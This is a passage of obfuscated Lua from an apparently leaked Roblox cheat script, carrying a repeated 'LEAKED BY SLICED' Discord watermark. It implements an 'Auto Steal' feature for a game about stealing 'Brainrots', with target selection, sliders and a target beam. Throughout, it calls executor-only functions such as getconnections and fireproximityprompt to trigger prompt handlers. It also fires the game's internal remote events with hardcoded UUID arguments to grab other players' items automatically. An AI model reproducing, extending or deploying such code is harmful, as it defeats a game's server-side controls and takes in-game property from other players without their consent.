		local slicedfn22, slicedfn23, slicedfn24

		do
			local frame4 = Instance.new("Frame")
			frame4.Position = UDim2.fromOffset(14, 41)  -- LEAKED BY SLICED | discord.gg/pubmethod
			frame4.Size = UDim2.new(1, -28, 0, 4)
			frame4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			frame4.BackgroundTransparency = 0.9
			frame4.BorderSizePixel = 0
			frame4.Visible = false
			frame4.Parent = frame
			Instance.new("UICorner", frame4).CornerRadius = UDim.new(1, 0)
			frame3 = Instance.new("Frame")
			frame3.Size = UDim2.new(0, 0, 1, 0)
			frame3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)  -- LEAKED BY SLICED | discord.gg/pubmethod
			frame3.BackgroundTransparency = 0.55
			frame3.BorderSizePixel = 0
			frame3.Parent = frame4
			Instance.new("UICorner", frame3).CornerRadius = UDim.new(1, 0)
			visible = false
			flag8 = false
			slicedn8 = 0
			slicedn9 = 1
			slicedn10 = 0
			slicedn11 = 0  -- LEAKED BY SLICED | discord.gg/pubmethod

			slicedfn20 = function()
				flag8 = false
			end

			slicedfn21 = function(arg)
				if not flag5 or not screenGui2.Parent then
					flag8 = false
					return
				end
				slicedn9 = math.max(tonumber(arg) or 1, 0.01)
				slicedn8 = os.clock()  -- LEAKED BY SLICED | discord.gg/pubmethod
				flag8 = true
			end

			local slicedn12 = 0.22
			local slicedn13 = 10
			local color = Color3.fromRGB(255, 255, 255)
			sliced13 = nil
			local sliced14 = nil
			local radius = 0

			slicedfn22 = function()
				if connection then  -- LEAKED BY SLICED | discord.gg/pubmethod
					connection:Disconnect()
					connection = nil
				end

				if sliced14 then
					pcall(function()
						sliced14:Destroy()
					end)

					sliced14 = nil
				end

				if sliced13 then  -- LEAKED BY SLICED | discord.gg/pubmethod
					pcall(function()
						sliced13:Destroy()
					end)

					sliced13 = nil
				end

				radius = 0
			end

			local function slicedfn25()
				if sliced13 and sliced13.Parent and sliced14 then
					return  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
				slicedfn22()
				local part = Instance.new("Part")
				part.Name = fn()
				part.Anchored = true
				part.CanCollide = false
				part.CanQuery = false
				part.CanTouch = false
				part.CastShadow = false
				part.Massless = true  -- LEAKED BY SLICED | discord.gg/pubmethod
				part.Size = Vector3.one
				part.Transparency = 1
				part.Parent = Workspace
				local cylinderHandleAdornment = Instance.new("CylinderHandleAdornment")
				cylinderHandleAdornment.Name = fn()
				cylinderHandleAdornment.Adornee = part
				cylinderHandleAdornment.AlwaysOnTop = true
				cylinderHandleAdornment.Color3 = color
				cylinderHandleAdornment.Height = 0.05
				cylinderHandleAdornment.InnerRadius = 0  -- LEAKED BY SLICED | discord.gg/pubmethod
				cylinderHandleAdornment.Radius = 0
				cylinderHandleAdornment.Transparency = 0.25
				cylinderHandleAdornment.ZIndex = 1
				cylinderHandleAdornment.Parent = part
				sliced13 = part
				sliced14 = cylinderHandleAdornment
			end

			slicedfn23 = function(arg)
				local character_ = localPlayer.Character
				character_ = character_ and character_:FindFirstChild("HumanoidRootPart")  -- LEAKED BY SLICED | discord.gg/pubmethod

				if not visible or not character_ then
					if sliced13 then
						slicedfn22()
					end

					return
				end

				slicedfn25()
				local slicedn14 = math.max(tonumber(slicedn3) or 20, 1)
				local slicedn15 = math.min(arg or 0.016, 0.1)

				if radius <= 0 then  -- LEAKED BY SLICED | discord.gg/pubmethod
					radius = slicedn14
				else
					radius += (slicedn14 - radius) * (1 - math.exp(-slicedn15 * slicedn13))
				end

				sliced13.CFrame = CFrame.new(character_.Position - Vector3.new(0, 2.9, 0)) * CFrame.Angles(-1.5707963267948966, 0, 0)
				sliced14.Radius = radius
				sliced14.InnerRadius = math.max(radius - slicedn12, 0)
			end

			slicedfn24 = function(arg)
				visible = arg == true  -- LEAKED BY SLICED | discord.gg/pubmethod
				frame4.Visible = visible
				frame.Size = UDim2.fromOffset(248, visible and 55 or 46)

				if not visible then
					slicedn11 = 0
					frame3.Size = UDim2.new(0, 0, 1, 0)
					slicedfn22()
				end
			end
		end

		local slicedfn25  -- LEAKED BY SLICED | discord.gg/pubmethod

		slicedfn25 = function(arg, arg2, arg3)
			if textLabel.Parent then
				textLabel.Text = tostring(arg or "")
				chilliGithubFastManualDefaultsRu.ApplyBrainrotNameStyle(chilliGithubFastManualDefaultsRu.AutoStealBarNameStyle, arg3)
			end

			if textLabel2.Parent then
				textLabel2.Text = tostring(arg2 or "")
			end
		end

		do  -- LEAKED BY SLICED | discord.gg/pubmethod
			local flag9 = false
			local sliced14 = nil
			local vector2 = Vector2.new(0, 0)
			local position = nil

			slicedfn4(frame.InputBegan:Connect(function(input)
				if flag9 or input.UserInputState ~= Enum.UserInputState.Begin then
					return
				end
				local flag10 = input.UserInputType == Enum.UserInputType.Touch
				if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not flag10 then  -- LEAKED BY SLICED | discord.gg/pubmethod
					return
				end
				local vector22 = Vector2.new(input.Position.X, input.Position.Y)
				local absolutePosition = frame.AbsolutePosition
				local absoluteSize = frame.AbsoluteSize
				if vector22.X < absolutePosition.X or vector22.X > absolutePosition.X + absoluteSize.X or vector22.Y < absolutePosition.Y or vector22.Y > absolutePosition.Y + absoluteSize.Y then
					return
				end
				flag9 = true
				sliced14 = flag10 and input or nil  -- LEAKED BY SLICED | discord.gg/pubmethod
				vector2 = vector22
				position = frame.Position
			end))

			slicedfn4(UserInputService2.InputChanged:Connect(function(input)
				if not flag9 then
					return
				end

				if not (sliced14 and input == sliced14 or not sliced14 and input.UserInputType == Enum.UserInputType.MouseMovement) or not position then
					return
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
				local slicedn12 = Vector2.new(input.Position.X, input.Position.Y) - vector2
				frame.Position = UDim2.new(position.X.Scale, position.X.Offset + slicedn12.X, position.Y.Scale, position.Y.Offset + slicedn12.Y)
			end))

			slicedfn4(UserInputService2.InputEnded:Connect(function(input)
				if not flag9 then
					return
				end
				local flag10 = sliced14 and input == sliced14
				local flag11

				if flag10 then  -- LEAKED BY SLICED | discord.gg/pubmethod
					flag11 = flag10
				else
					flag11 = not sliced14 and input.UserInputType == Enum.UserInputType.MouseButton1
				end

				if flag11 then
					flag9 = false
					sliced14 = nil
					position = nil
				end
			end))  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local slicedfn26

		slicedfn26 = function()
			if screenGui2.Parent then
				screenGui2.Enabled = flag3 and flag5
			end

			if not flag3 or not flag5 then
				slicedfn20()
				slicedfn25("", "")
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		do
			local slicedn12 = 1
			local slicedn13 = 0.25
			local slicedn14 = -math.huge
			local slicedn15 = -math.huge

			local function slicedfn27()
				if not flag3 then
					return
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
				local now = os.clock()
				if now - slicedn14 < slicedn12 then
					return
				end
				slicedn14 = now

				task.spawn(function()
					slicedfn14()
					task.wait(0.05)
					slicedfn13()
				end)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			local function slicedfn28(arg)
				local now = os.clock()
				if now - slicedn15 < slicedn13 then
					return
				end
				slicedn15 = now

				for _, sliced14 in ipairs(arg) do
					pcall(sliced14)
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			local function slicedfn29(arg)
				if not (arg and arg.Parent) or type(getconnections) ~= "function" then
					return
				end

				pcall(function()
					for _, sliced14 in pairs(getconnections(arg.PromptButtonHoldEnded)) do
						if sliced14 and sliced14.Function then
							pcall(sliced14.Function)
						end  -- LEAKED BY SLICED | discord.gg/pubmethod
					end
				end)
			end

			local function slicedfn30(arg, arg2, arg3, arg4, arg5)
				local prompt3 = type(arg) == "table" and arg.Prompt or arg
				local plotName = type(arg) == "table" and arg.PlotName or nil
				local slotName = type(arg) == "table" and arg.SlotName or nil
				if not prompt3 then
					return false, "no prompt"
				end  -- LEAKED BY SLICED | discord.gg/pubmethod

				if str2 == "Fix 1 (Wait Before Fire)" then
					task.wait(0.1)
				end

				local slicedn16 = os.clock() - slicedn6
				local slicedn17 = 0

				if str2 == "Fix 2 (Longer Settle)" then
					slicedn17 = 1.5
				end

				if slicedn16 < slicedn17 then
					task.wait(slicedn17 - slicedn16)  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				if not flag2 or not flag3 or arg2 ~= slicedn5 then
					return false, "stopped"
				end
				local sliced14, sliced15 = slicedfn19(prompt3)
				if not sliced14 or not sliced15 then
					return false, "no handlers"
				end
				local slicedn18 = 1.3

				if flag6 then  -- LEAKED BY SLICED | discord.gg/pubmethod
					flag6 = false
					slicedn18 = 2
				end

				if arg4 then
					pcall(arg4, slicedn18)
				end

				if str2 == "Xen Hub Source sliced11" then
					if plotName and slotName then
						local function slicedfn31()
							pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
								local reB096e1ca9c3a453b8b60268b235083 = game:GetService("ReplicatedStorage").Packages.Net["RE/b096e1ca-9c3a-453b-8b60-268b235083b9"]
								reB096e1ca9c3a453b8b60268b235083:FireServer(Workspace:GetServerTimeNow() + 53, "5c0bd012-dfb2-4bac-8f1a-e41f136e4744")
								reB096e1ca9c3a453b8b60268b235083:FireServer(Workspace:GetServerTimeNow() + 53, "6be28b5b-dbc3-4aab-aa0c-6ebcfa191f22")
							end)
						end

						local function slicedfn32(arg6, arg7)
							pcall(function()
								game:GetService("ReplicatedStorage").Packages.Net["RE/5aa39ea1-0c65-4fcf-aff9-b18a7ef277c3"]:FireServer(Workspace:GetServerTimeNow() + 67, "c262398d-68e3-4499-8bea-99766bf11686", arg6, tonumber(arg7) or arg7)
								local sliced16
								sliced16:FireServer(Workspace:GetServerTimeNow() + 67, "579e6c26-5a80-407d-9488-0f84752e8f1f", arg6, tonumber(arg7) or arg7)  -- LEAKED BY SLICED | discord.gg/pubmethod
							end)
						end

						slicedfn31()
						task.wait(1.3)
						slicedfn32(plotName, slotName)
						return true, "fired xen hub source"
					end

					for _, sliced16 in ipairs(sliced14) do
						pcall(sliced16)
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					task.wait(1.3)

					for _, sliced16 in ipairs(sliced15) do
						pcall(sliced16)
					end

					return true, "fired fallback"
				end

				if str2 and string.find(str2, "sliced20") and localPlayer:GetAttribute("Stealing") == true then
					return false, "v20_radar"
				end

				if str2 and string.find(str2, "sliced21") then  -- LEAKED BY SLICED | discord.gg/pubmethod
					local now = os.clock()

					while not prompt3.Enabled and prompt3.Parent and os.clock() - now < 0.6 do
						task.wait(0.02)
					end
				end

				if os.clock() - slicedn6 < 1.5 and str2 and (string.find(str2, "Smart Window") or string.find(str2, "sliced19") or string.find(str2, "sliced19")) then
					for _, sliced16 in ipairs(sliced14) do
						pcall(sliced16)
					end

					task.wait(slicedn18)  -- LEAKED BY SLICED | discord.gg/pubmethod

					for _, sliced16 in ipairs(sliced15) do
						pcall(sliced16)
					end

					slicedn6 = os.clock()
					return true, "fired (sliced14 protected window)"
				end

				local flag9 = str2 and string.find(str2, "sliced23")

				if flag9 then
					local globalCacheLockUntil = globalCacheLockUntil
					flag9 = os.clock() < globalCacheLockUntil  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				if (isDebris or flag9) and str2 and string.find(str2, "sliced22") then
					for _, sliced16 in ipairs(sliced14) do
						pcall(sliced16)
					end

					task.wait(slicedn18)

					for _, sliced16 in ipairs(sliced15) do
						pcall(sliced16)
					end

					slicedfn29(prompt3)  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedn6 = os.clock()
					return true, "fired (sliced22 debris cache hold)"
				end

				if str2 == "Fix 4 (FireProximityPrompt)" then
					if fireproximityprompt then
						fireproximityprompt(prompt3, 0)
						fireproximityprompt(prompt3, 1)
					end
				end

				for _, sliced16 in ipairs(sliced14) do  -- LEAKED BY SLICED | discord.gg/pubmethod
					pcall(sliced16)
				end

				local str3 = tostring(prompt3.ObjectText)
				local now = os.clock()

				while os.clock() - now < slicedn18 do
					task.wait(0.05)
					if not flag2 or not flag3 or arg2 ~= slicedn5 then
						slicedfn29(prompt3)
						return false, "stopped"
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					if not arg5 and localPlayer:GetAttribute("Stealing") == true then
						for _, sliced16 in ipairs(sliced15) do
							pcall(sliced16)
						end

						slicedfn29(prompt3)
						return false, "carrying"
					end

					if tostring(prompt3.ObjectText) ~= str3 then
						slicedfn28(sliced15)
						slicedfn27()  -- LEAKED BY SLICED | discord.gg/pubmethod
						slicedfn29(prompt3)
						return false, "brainrot changed"
					end

					if not prompt3.Parent or not prompt3.Enabled or not arg3() then
						slicedfn28(sliced15)
						slicedfn27()
						slicedfn29(prompt3)
						return false, "retargeted"
					end
				end  -- LEAKED BY SLICED | discord.gg/pubmethod

				local sliced16

				if str2 == "Default (Chilli Hub)" or str2 == "Fix 3 (Re-fetch Triggers)" then
					local sliced17
					sliced17, sliced16 = slicedfn19(prompt3)
					sliced16 = sliced16 or sliced15
				else
					sliced16 = sliced15
				end

				for _, sliced17 in ipairs(sliced16) do
					pcall(sliced17)  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				slicedfn29(prompt3)
				slicedn6 = os.clock()
				return true, "fired"
			end

			local function slicedfn31(arg, arg2, arg3)
				if not flag2 or not flag3 or arg2 ~= slicedn5 then
					return false
				end

				if arg3 and localPlayer:GetAttribute("Stealing") ~= true then  -- LEAKED BY SLICED | discord.gg/pubmethod
					return false
				end
				local character_ = localPlayer.Character
				local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					return false
				end

				if flag4 then
					local prompt3 = arg.Prompt
					if not prompt3 or not prompt3.Parent or not prompt3.Enabled or tostring(prompt3.ActionText) ~= str or slicedfn7(prompt3) then  -- LEAKED BY SLICED | discord.gg/pubmethod
						return false
					end
					local position = arg.Position
					return not position or (humanoidRootPart.Position - position).Magnitude <= slicedn3
				end

				if prompt2 and prompt2.Parent then
					return arg.Prompt == prompt2
				end
				local sliced14

				if str2 and (string.find(str2, "Mac Lib") or string.find(str2, "Original")) then  -- LEAKED BY SLICED | discord.gg/pubmethod
					local sliced15
					sliced15, sliced14 = slicedfn17(humanoidRootPart)
				else
					local sliced15
					sliced15, sliced14 = slicedfn18(humanoidRootPart)
				end

				if not sliced14 then
					return false
				end

				if sliced14.Prompt == arg.Prompt then  -- LEAKED BY SLICED | discord.gg/pubmethod
					return true
				end
				return sliced14.Distance >= (humanoidRootPart.Position - arg.Position).Magnitude - n
			end

			local function slicedfn32(arg)
				local sliced14 = prompt
				local parent = prompt

				if sliced14 then
					parent = sliced14.Parent
				end  -- LEAKED BY SLICED | discord.gg/pubmethod

				if parent then
					local now = os.clock()

					while flag2 and flag3 and arg == slicedn5 and os.clock() - now < 1 do
						if sliced14.Enabled and tostring(sliced14.ActionText) == str then
							return
						end
						task.wait(0.05)
					end
				else
					task.wait(0.2)  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end

			local function slicedfn33(arg)
				local flag9 = false

				while true do
					if flag2 and flag3 and arg == slicedn5 then
						local flag10 = localPlayer:GetAttribute("Stealing") == true

						if not flag9 then
							if str2 and string.find(str2, "sliced19") then
								task.wait()  -- LEAKED BY SLICED | discord.gg/pubmethod
							else
								task.wait(0.1)
							end
						end

						local flag11 = not flag2 or not flag3 or arg ~= slicedn5
						flag9 = false

						if not flag11 then
							if not (str2 and string.find(str2, "sliced20")) and localPlayer:GetAttribute("Stealing") == true then
								flag7 = true
								slicedfn20()  -- LEAKED BY SLICED | discord.gg/pubmethod

								if flag5 then
									slicedfn25("GET READY - carrying brainrot", "")
								end

								while flag2 and flag3 and arg == slicedn5 and localPlayer:GetAttribute("Stealing") == true do
									if str2 and string.find(str2, "sliced19") then
										task.wait()
									else
										task.wait(0.05)
									end
								end  -- LEAKED BY SLICED | discord.gg/pubmethod

								if not (str2 and string.find(str2, "sliced19")) then
									slicedfn32(arg)
								end

								flag7 = false

								if str2 and string.find(str2, "sliced19") then
									flag9 = true
								end
							else
								if not (str2 and string.find(str2, "sliced20")) then
									slicedfn16(nil)  -- LEAKED BY SLICED | discord.gg/pubmethod
								end

								flag7 = false
								local character_ = localPlayer.Character
								character_ = character_ and character_:FindFirstChild("HumanoidRootPart")

								if not character_ then
									slicedfn20()
								else
									local sliced14, sliced15, sliced16

									if flag4 then
										sliced14, sliced15, sliced16 = slicedfn18(character_)  -- LEAKED BY SLICED | discord.gg/pubmethod
									else
										sliced14, sliced15 = slicedfn17(character_)
										sliced16 = nil
									end

									local sliced17 = slicedfn12(character_, sliced14, sliced15, sliced16)
									slicedfn15(sliced17)

									if not sliced17 then
										slicedfn20()
									else
										prompt = sliced17.Prompt  -- LEAKED BY SLICED | discord.gg/pubmethod

										if not slicedfn30(sliced17, arg, function()
											return slicedfn31(sliced17, arg, false)
										end, slicedfn21, false) then
											slicedfn20()
										end
									end
								end
							end

							continue
						end  -- LEAKED BY SLICED | discord.gg/pubmethod
					end

					break
				end
			end

			slicedfn13 = function()
				slicedn5 += 1
				flag3 = true
				flag7 = false
				slicedn7 = -math.huge
				slicedfn26()  -- LEAKED BY SLICED | discord.gg/pubmethod
				task.spawn(slicedfn33, slicedn5)
			end
		end

		slicedfn14 = function()
			flag3 = false
			flag7 = false
			slicedn5 += 1
			slicedfn20()
			slicedfn16(nil)
			slicedfn26()  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local slicedn12 = 0

		slicedfn4(localPlayer:GetAttributeChangedSignal("Stealing"):Connect(function()
			if localPlayer:GetAttribute("Stealing") == true then
				slicedn6 = os.clock()
				slicedn12 += 1
				local sliced14 = slicedn12

				task.spawn(function()
					task.wait(1.5)

					if flag3 and localPlayer:GetAttribute("Stealing") == true and slicedn12 == sliced14 then  -- LEAKED BY SLICED | discord.gg/pubmethod
						slicedfn14()
						task.wait(0.05)
						slicedfn13()
					end
				end)
			else
				slicedn12 += 1

				if not (os.clock() - slicedn4 < 0.5) then
					local flag9 = false

					if RagdollController then  -- LEAKED BY SLICED | discord.gg/pubmethod
						local ok, result = pcall(function()
							return RagdollController.IsInRagdoll()
						end)

						if ok and result == true then
							flag9 = true
						end
					end

					if not flag9 then
						local character_ = localPlayer.Character
						character_ = character_ and character_:FindFirstChildOfClass("Humanoid")  -- LEAKED BY SLICED | discord.gg/pubmethod

						if character_ then
							local state = character_:GetState()

							if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.FallingDown or state == Enum.HumanoidStateType.Ragdoll then
								flag9 = true
							end
						end
					end

					local flag10

					if not flag9 then
						local character_ = localPlayer.Character  -- LEAKED BY SLICED | discord.gg/pubmethod

						if character_ and character_:FindFirstChildOfClass("BallSocketConstraint", true) then
							flag10 = true
						else
							flag10 = flag9
						end
					else
						flag10 = flag9
					end

					if flag10 then
						flag6 = true  -- LEAKED BY SLICED | discord.gg/pubmethod
					end
				end
			end
		end))

		slicedfn4(Workspace.ChildAdded:Connect(function(child)
			if child.Name == "Plots" then
				slicedn7 = -math.huge
			end
		end))

		local plots = Workspace:FindFirstChild("Plots")  -- LEAKED BY SLICED | discord.gg/pubmethod

		if plots then
			slicedfn4(plots.ChildAdded:Connect(function()
				slicedn7 = -math.huge
			end))

			slicedfn4(plots.ChildRemoved:Connect(function()
				slicedn7 = -math.huge
			end))
		end

		local sliced14

		sliced14 = sliced12:CreateToggle({  -- LEAKED BY SLICED | discord.gg/pubmethod
			Name = "Auto Steal",
			Default = true,
			Callback = function(arg)
				str2 = "Auto Get Default"

				if arg then
					slicedfn13()
				else
					slicedfn14()
				end
			end,  -- LEAKED BY SLICED | discord.gg/pubmethod
		})

		local slicedfn27

		slicedfn27 = function()
			if sliced14 and sliced14.Get and sliced14:Get() ~= true then
				sliced14:Set(true, true)
			end
		end

		sliced12:CreateToggle({
			Name = "Steal Best Brainrot Only",
			Default = false,  -- LEAKED BY SLICED | discord.gg/pubmethod
			Quick = false,
			SubOf = sliced14,
			Callback = function(arg)
				flag4 = arg == true
			end,
		})

		do
			local tbl4 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },  -- LEAKED BY SLICED | discord.gg/pubmethod
				["B/s"] = { Min = 1, Max = 10, Mult = 1e9 },
			}

			local createSlider = nil
			local slicedn13 = 1
			local str3 = "M/s"

			local function slicedfn28(arg, arg2)
				if arg ~= nil then
					slicedn13 = math.floor(tonumber(arg) or slicedn13)
				end

				if arg2 ~= nil then  -- LEAKED BY SLICED | discord.gg/pubmethod
					str3 = tostring(arg2)
				elseif createSlider and createSlider.GetUnit then
					local unit = createSlider:GetUnit()

					if unit and unit ~= "" then
						str3 = tostring(unit)
					end
				end

				slicedn2 = slicedn13 * (tbl4[str3] or tbl4["M/s"]).Mult
				slicedn7 = -math.huge
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			local function slicedfn29(arg)
				str3 = arg
				local ms = tbl4[arg] or tbl4["M/s"]

				if createSlider and createSlider.SetRange then
					createSlider:SetRange(ms.Min, ms.Max)
					local min = createSlider:Get() or ms.Min
					local min2 = ms.Min
					local max = ms.Max
					local slicedn14 = math.clamp(math.floor(min + 0.5), min2, max)

					if slicedn14 ~= min then  -- LEAKED BY SLICED | discord.gg/pubmethod
						createSlider:Set(slicedn14)
					else
						slicedfn28(slicedn14, arg)
					end
				else
					slicedfn28(nil, arg)
				end
			end

			createSlider = sliced12.CreateSlider

			createSlider = createSlider(sliced12, {  -- LEAKED BY SLICED | discord.gg/pubmethod
				Name = "Auto Steal Min Value",
				Note = "Filters out Brainrots below this threshold. Tap arrow to change unit (K/s, M/s, B/s).",
				Min = 0,
				Max = 1000,
				Default = 0,
				AllowDecimals = false,
				Increment = 1,
				Unit = {
					Default = "M/s",
					Selector = true,  -- LEAKED BY SLICED | discord.gg/pubmethod
					Options = { "K/s", "M/s", "B/s" },
					ColorEnabled = true,
					Colors = { Number = Color3.fromRGB(255, 255, 255), Suffix = Color3.fromRGB(58, 255, 55) },
					Callback = function(arg)
						slicedfn29(arg)
					end,
				},
				Quick = false,
				SubOf = sliced14,
				Callback = function(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedfn28(arg, nil)
				end,
			})
		end

		sliced12:CreateSlider({
			Name = "Auto Steal Distance",
			Min = 10,
			Max = 200,
			Default = 58,
			AllowDecimals = false,  -- LEAKED BY SLICED | discord.gg/pubmethod
			Increment = 1,
			Unit = " studs",
			Quick = false,
			SubOf = sliced14,
			Callback = function(arg)
				slicedn3 = math.clamp(tonumber(arg) or 20, 10, 200)
			end,
		})

		local slicedfn28

		do  -- LEAKED BY SLICED | discord.gg/pubmethod
			local color = Color3.fromRGB(170, 255, 0)
			local color2 = Color3.fromRGB(240, 255, 210)
			local flag9 = false
			local attachment = nil
			local attachment2 = nil
			local beam = nil
			local sliced15 = nil
			local sliced16 = nil
			local slicedn13 = -math.huge

			slicedfn28 = function()  -- LEAKED BY SLICED | discord.gg/pubmethod
				pcall(function()
					if beam then
						beam:Destroy()
					end
				end)

				pcall(function()
					if attachment then
						attachment:Destroy()
					end
				end)  -- LEAKED BY SLICED | discord.gg/pubmethod

				pcall(function()
					if attachment2 then
						attachment2:Destroy()
					end
				end)

				beam = nil
				attachment = nil
				attachment2 = nil
				sliced15 = nil
				sliced16 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			local function slicedfn29()
				local sliced17 = Workspace:FindFirstChild(localPlayer.Name)
				if not sliced17 or not sliced17:IsA("Model") then
					return nil
				end
				local humanoidRootPart = sliced17:FindFirstChild("HumanoidRootPart")
				if humanoidRootPart and humanoidRootPart:IsA("BasePart") and humanoidRootPart.Parent == sliced17 then
					return humanoidRootPart
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
				local hitbox = sliced17:FindFirstChild("__HITBOX") or sliced17:FindFirstChild("__hitbox") or sliced17:FindFirstChild("Hitbox") or sliced17:FindFirstChild("HitBox")
				if hitbox and hitbox:IsA("BasePart") then
					return hitbox
				end
				return nil
			end

			local function slicedfn30(parent, parent2)
				slicedfn28()
				if not (parent and parent2) then
					return  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
				attachment = Instance.new("Attachment")
				attachment.Name = fn()
				attachment.Position = Vector3.new(0, 0.6, 0)
				attachment.Parent = parent
				attachment2 = Instance.new("Attachment")
				attachment2.Name = fn()
				attachment2.Position = Vector3.new(0, 2.6, 0)
				attachment2.Parent = parent2
				beam = Instance.new("Beam")  -- LEAKED BY SLICED | discord.gg/pubmethod
				beam.Name = fn()
				beam.Archivable = false
				beam.Attachment0 = attachment
				beam.Attachment1 = attachment2
				beam.Color = ColorSequence.new(color, color2)
				beam.CurveSize0 = 0
				beam.CurveSize1 = 0
				beam.FaceCamera = true
				beam.LightEmission = 1
				beam.Segments = 4  -- LEAKED BY SLICED | discord.gg/pubmethod
				beam.Texture = "rbxassetid://446111271"
				beam.TextureLength = 3
				beam.TextureMode = Enum.TextureMode.Wrap
				beam.TextureSpeed = 3
				local sliced17 = beam
				local numberSequence = NumberSequence.new
				local tbl4 = {}
				local sliced18 = NumberSequenceKeypoint.new(0, 0)
				local sliced19 = NumberSequenceKeypoint.new(0.85, 0)
				tbl4[1] = sliced18  -- LEAKED BY SLICED | discord.gg/pubmethod
				tbl4[2] = sliced19

				do
					local values = table.pack(NumberSequenceKeypoint.new(1, 0.25))
					table.move(values, 1, values.n, 3, tbl4)
				end

				sliced17.Transparency = numberSequence(tbl4)
				beam.Width0 = 0.34
				beam.Width1 = 0.7
				beam.ZOffset = 0.1
				obj[beam] = true  -- LEAKED BY SLICED | discord.gg/pubmethod
				beam.Parent = attachment
				sliced15 = parent
				sliced16 = parent2
			end

			local function slicedfn31()
				if not (flag9 and flag3) then
					if beam then
						slicedfn28()
					end

					return  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				local now = os.clock()
				if now - slicedn13 < 0.1 then
					return
				end
				slicedn13 = now
				local character_ = localPlayer.Character
				local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")
				local sliced17 = slicedfn29(character_)
				if not (humanoidRootPart and sliced17) then  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedfn28()
					return
				end
				local sliced18, sliced19, sliced20 = slicedfn18(humanoidRootPart)
				local sliced21 = slicedfn12(humanoidRootPart, sliced18, sliced19, sliced20)
				local spawn = sliced21 and slicedfn10(sliced21.Prompt) or nil
				spawn = spawn and spawn.Spawn or nil
				if not spawn then
					slicedfn28()
					return  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
				local flag10 = sliced15 ~= sliced17 or sliced16 ~= spawn

				if not flag10 then
					flag10 = not (attachment and attachment.Parent)
				end

				if flag10 then
					slicedfn30(sliced17, spawn)
				end
			end

			slicedfn4(RunService.Heartbeat:Connect(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
				if flag2 then
					slicedfn31()
				end
			end))

			sliced12:CreateToggle({
				Name = "Target Beam",
				Note = "Draws a straight amber line to the Brainrot Auto Steal is targeting.",
				Default = true,
				Quick = false,
				SubOf = sliced14,  -- LEAKED BY SLICED | discord.gg/pubmethod
				Callback = function(arg)
					flag9 = arg == true

					if not flag9 then
						slicedfn28()
					end
				end,
			})
		end

		local slicedn13 = 140
		local slicedn14 = 5  -- LEAKED BY SLICED | discord.gg/pubmethod
		local slicedn15 = 0.5
		local color = Color3.fromRGB(58, 255, 55)
		local slicedn16 = 214
		local slicedn17 = 40
		local slicedn18 = 44
		local screenGui3 = nil
		local sliced15 = nil
		local sliced16 = nil
		local tbl4 = {}
		local sliced17 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		local sliced18 = nil
		local flag9, slicedn19, slicedn20, sliced19, flag10, slicedn21, str3, slicedfn29

		do
			local sliced20 = nil
			local sliced21 = nil
			local sliced22 = nil
			flag9 = false
			slicedn19 = 5
			slicedn20 = 1
			sliced19 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
			flag10 = false
			slicedn21 = -math.huge
			local sliced23 = nil
			local slicedn22 = -math.huge
			str3 = ""
			local gothamBold = Enum.Font.GothamBold

			pcall(function()
				gothamBold = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
			end)

			local function slicedfn30(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
				if typeof(gothamBold) == "Font" then
					arg.FontFace = gothamBold
				else
					arg.Font = Enum.Font.GothamBold
				end
			end

			local sliced24 = sliced2:CreateState({
				Name = "Base Target Panel Position",
				Default = {
					XOffset = 0,  -- LEAKED BY SLICED | discord.gg/pubmethod
					XScale = 0.78183454275131226,
					YScale = 0.022769367322325706,
					YOffset = 0,
				},
			})

			local function slicedfn31()
				local sliced25 = sliced24:Get()
				if type(sliced25) == "table" and type(sliced25.XOffset) == "number" and type(sliced25.YOffset) == "number" then
					return UDim2.new(tonumber(sliced25.XScale) or 1, sliced25.XOffset, tonumber(sliced25.YScale) or 0.5, sliced25.YOffset)
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
				return UDim2.new(1, -18, 0.5, 0)
			end

			local function slicedfn32(arg)
				sliced24:Set({ XScale = arg.X.Scale, XOffset = arg.X.Offset, YScale = arg.Y.Scale, YOffset = arg.Y.Offset })
			end

			local tweenInfo = TweenInfo.new(0.28, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
			local slicedn23 = 0
			local sliced25 = nil

			local function slicedfn33()
				if not sliced15 then  -- LEAKED BY SLICED | discord.gg/pubmethod
					return
				end
				local visible2 = slicedn23 == 0 and not flag9

				if sliced20 then
					sliced20.Visible = visible2
					sliced20.Text = sliced25 and "no brainrot left in this base" or "no base nearby"
				end

				local slicedn24 = flag9 and 0 or slicedn23
				local slicedn25

